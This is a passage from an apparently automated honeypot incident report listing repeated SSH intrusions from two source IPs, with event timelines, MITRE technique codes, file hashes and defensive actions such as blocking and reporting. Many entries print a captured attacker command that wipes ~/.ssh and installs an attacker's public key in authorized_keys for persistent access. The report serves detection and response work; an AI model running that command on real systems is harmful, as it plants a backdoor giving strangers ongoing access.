| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:51:25` | `cowrie.session.connect` |
| `2026-04-12 20:51:25` | `cowrie.client.version` |
| `2026-04-12 20:51:25` | `cowrie.client.kex` |
| `2026-04-12 20:51:25` | `cowrie.login.success` |
| `2026-04-12 20:51:26` | `cowrie.session.params` |
| `2026-04-12 20:51:26` | `cowrie.command.input` |
| `2026-04-12 20:51:26` | `cowrie.command.failed` |
| `2026-04-12 20:51:26` | `cowrie.log.closed` |
| `2026-04-12 20:51:26` | `cowrie.session.params` |
| `2026-04-12 20:51:26` | `cowrie.command.input` |
| `2026-04-12 20:51:26` | `cowrie.session.file_download` |
| `2026-04-12 20:51:26` | `cowrie.log.closed` |
| `2026-04-12 20:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1137cc81dc6f

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:51 |
| **Last Seen** | 2026-04-12 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:51:29` | `cowrie.session.connect` |
| `2026-04-12 20:51:29` | `cowrie.client.version` |
| `2026-04-12 20:51:29` | `cowrie.client.kex` |
| `2026-04-12 20:51:29` | `cowrie.login.success` |
| `2026-04-12 20:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afed39a7e4a2

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:51 |
| **Last Seen** | 2026-04-12 20:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:51:34` | `cowrie.session.connect` |
| `2026-04-12 20:51:34` | `cowrie.client.version` |
| `2026-04-12 20:51:34` | `cowrie.client.kex` |
| `2026-04-12 20:51:35` | `cowrie.login.success` |
| `2026-04-12 20:51:36` | `cowrie.session.params` |
| `2026-04-12 20:51:36` | `cowrie.command.input` |
| `2026-04-12 20:51:36` | `cowrie.command.failed` |
| `2026-04-12 20:51:36` | `cowrie.log.closed` |
| `2026-04-12 20:51:37` | `cowrie.session.params` |
| `2026-04-12 20:51:37` | `cowrie.command.input` |
| `2026-04-12 20:51:37` | `cowrie.session.file_download` |
| `2026-04-12 20:51:37` | `cowrie.log.closed` |
| `2026-04-12 20:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da700b771d8

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:51 |
| **Last Seen** | 2026-04-12 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:51:40` | `cowrie.session.connect` |
| `2026-04-12 20:51:40` | `cowrie.client.version` |
| `2026-04-12 20:51:41` | `cowrie.client.kex` |
| `2026-04-12 20:51:42` | `cowrie.login.success` |
| `2026-04-12 20:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3418eef7ec9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:52 |
| **Last Seen** | 2026-04-12 20:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:52:07` | `cowrie.session.connect` |
| `2026-04-12 20:52:07` | `cowrie.client.version` |
| `2026-04-12 20:52:08` | `cowrie.client.kex` |
| `2026-04-12 20:52:08` | `cowrie.login.success` |
| `2026-04-12 20:52:08` | `cowrie.session.params` |
| `2026-04-12 20:52:08` | `cowrie.command.input` |
| `2026-04-12 20:52:08` | `cowrie.command.failed` |
| `2026-04-12 20:52:09` | `cowrie.log.closed` |
| `2026-04-12 20:52:09` | `cowrie.session.params` |
| `2026-04-12 20:52:09` | `cowrie.command.input` |
| `2026-04-12 20:52:09` | `cowrie.session.file_download` |
| `2026-04-12 20:52:09` | `cowrie.log.closed` |
| `2026-04-12 20:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70bea1df5b48

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:52 |
| **Last Seen** | 2026-04-12 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:52:11` | `cowrie.session.connect` |
| `2026-04-12 20:52:11` | `cowrie.client.version` |
| `2026-04-12 20:52:11` | `cowrie.client.kex` |
| `2026-04-12 20:52:12` | `cowrie.login.success` |
| `2026-04-12 20:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39cc5a1cbb5d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:52 |
| **Last Seen** | 2026-04-12 20:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:52:52` | `cowrie.session.connect` |
| `2026-04-12 20:52:52` | `cowrie.client.version` |
| `2026-04-12 20:52:52` | `cowrie.client.kex` |
| `2026-04-12 20:52:53` | `cowrie.login.success` |
| `2026-04-12 20:52:53` | `cowrie.session.params` |
| `2026-04-12 20:52:53` | `cowrie.command.input` |
| `2026-04-12 20:52:53` | `cowrie.command.failed` |
| `2026-04-12 20:52:53` | `cowrie.log.closed` |
| `2026-04-12 20:52:53` | `cowrie.session.params` |
| `2026-04-12 20:52:53` | `cowrie.command.input` |
| `2026-04-12 20:52:54` | `cowrie.session.file_download` |
| `2026-04-12 20:52:54` | `cowrie.log.closed` |
| `2026-04-12 20:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fea6fcf5153

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:52 |
| **Last Seen** | 2026-04-12 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:52:56` | `cowrie.session.connect` |
| `2026-04-12 20:52:56` | `cowrie.client.version` |
| `2026-04-12 20:52:56` | `cowrie.client.kex` |
| `2026-04-12 20:52:56` | `cowrie.login.success` |
| `2026-04-12 20:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb25176056c7

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:53 |
| **Last Seen** | 2026-04-12 20:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:53:05` | `cowrie.session.connect` |
| `2026-04-12 20:53:05` | `cowrie.client.version` |
| `2026-04-12 20:53:05` | `cowrie.client.kex` |
| `2026-04-12 20:53:07` | `cowrie.login.success` |
| `2026-04-12 20:53:07` | `cowrie.session.params` |
| `2026-04-12 20:53:07` | `cowrie.command.input` |
| `2026-04-12 20:53:07` | `cowrie.command.failed` |
| `2026-04-12 20:53:07` | `cowrie.log.closed` |
| `2026-04-12 20:53:08` | `cowrie.session.params` |
| `2026-04-12 20:53:08` | `cowrie.command.input` |
| `2026-04-12 20:53:08` | `cowrie.session.file_download` |
| `2026-04-12 20:53:08` | `cowrie.log.closed` |
| `2026-04-12 20:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b9fcd561f3

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:53 |
| **Last Seen** | 2026-04-12 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:53:12` | `cowrie.session.connect` |
| `2026-04-12 20:53:12` | `cowrie.client.version` |
| `2026-04-12 20:53:12` | `cowrie.client.kex` |
| `2026-04-12 20:53:13` | `cowrie.login.success` |
| `2026-04-12 20:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d40b7e0fa3

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:53 |
| **Last Seen** | 2026-04-12 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:53:36` | `cowrie.session.connect` |
| `2026-04-12 20:53:36` | `cowrie.client.version` |
| `2026-04-12 20:53:36` | `cowrie.client.kex` |
| `2026-04-12 20:53:37` | `cowrie.login.success` |
| `2026-04-12 20:53:37` | `cowrie.session.params` |
| `2026-04-12 20:53:37` | `cowrie.command.input` |
| `2026-04-12 20:53:37` | `cowrie.command.failed` |
| `2026-04-12 20:53:37` | `cowrie.log.closed` |
| `2026-04-12 20:53:38` | `cowrie.session.params` |
| `2026-04-12 20:53:38` | `cowrie.command.input` |
| `2026-04-12 20:53:38` | `cowrie.session.file_download` |
| `2026-04-12 20:53:38` | `cowrie.log.closed` |
| `2026-04-12 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d36081605a

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:53 |
| **Last Seen** | 2026-04-12 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:53:40` | `cowrie.session.connect` |
| `2026-04-12 20:53:40` | `cowrie.client.version` |
| `2026-04-12 20:53:40` | `cowrie.client.kex` |
| `2026-04-12 20:53:41` | `cowrie.login.success` |
| `2026-04-12 20:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13519d8c4459

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:55 |
| **Last Seen** | 2026-04-12 20:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:55:06` | `cowrie.session.connect` |
| `2026-04-12 20:55:06` | `cowrie.client.version` |
| `2026-04-12 20:55:07` | `cowrie.client.kex` |
| `2026-04-12 20:55:07` | `cowrie.login.success` |
| `2026-04-12 20:55:07` | `cowrie.session.params` |
| `2026-04-12 20:55:07` | `cowrie.command.input` |
| `2026-04-12 20:55:07` | `cowrie.command.failed` |
| `2026-04-12 20:55:08` | `cowrie.log.closed` |
| `2026-04-12 20:55:08` | `cowrie.session.params` |
| `2026-04-12 20:55:08` | `cowrie.command.input` |
| `2026-04-12 20:55:08` | `cowrie.session.file_download` |
| `2026-04-12 20:55:08` | `cowrie.log.closed` |
| `2026-04-12 20:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7df3868acb

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:55 |
| **Last Seen** | 2026-04-12 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:55:10` | `cowrie.session.connect` |
| `2026-04-12 20:55:10` | `cowrie.client.version` |
| `2026-04-12 20:55:10` | `cowrie.client.kex` |
| `2026-04-12 20:55:11` | `cowrie.login.success` |
| `2026-04-12 20:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c41406b57d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:55 |
| **Last Seen** | 2026-04-12 20:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:55:50` | `cowrie.session.connect` |
| `2026-04-12 20:55:50` | `cowrie.client.version` |
| `2026-04-12 20:55:50` | `cowrie.client.kex` |
| `2026-04-12 20:55:50` | `cowrie.login.success` |
| `2026-04-12 20:55:51` | `cowrie.session.params` |
| `2026-04-12 20:55:51` | `cowrie.command.input` |
| `2026-04-12 20:55:51` | `cowrie.command.failed` |
| `2026-04-12 20:55:51` | `cowrie.log.closed` |
| `2026-04-12 20:55:51` | `cowrie.session.params` |
| `2026-04-12 20:55:51` | `cowrie.command.input` |
| `2026-04-12 20:55:51` | `cowrie.session.file_download` |
| `2026-04-12 20:55:51` | `cowrie.log.closed` |
| `2026-04-12 20:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213c4ef8aa1e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:55 |
| **Last Seen** | 2026-04-12 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:55:53` | `cowrie.session.connect` |
| `2026-04-12 20:55:53` | `cowrie.client.version` |
| `2026-04-12 20:55:53` | `cowrie.client.kex` |
| `2026-04-12 20:55:54` | `cowrie.login.success` |
| `2026-04-12 20:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44230e70284c

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:56 |
| **Last Seen** | 2026-04-12 20:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:56:10` | `cowrie.session.connect` |
| `2026-04-12 20:56:10` | `cowrie.client.version` |
| `2026-04-12 20:56:11` | `cowrie.client.kex` |
| `2026-04-12 20:56:12` | `cowrie.login.success` |
| `2026-04-12 20:56:13` | `cowrie.session.params` |
| `2026-04-12 20:56:13` | `cowrie.command.input` |
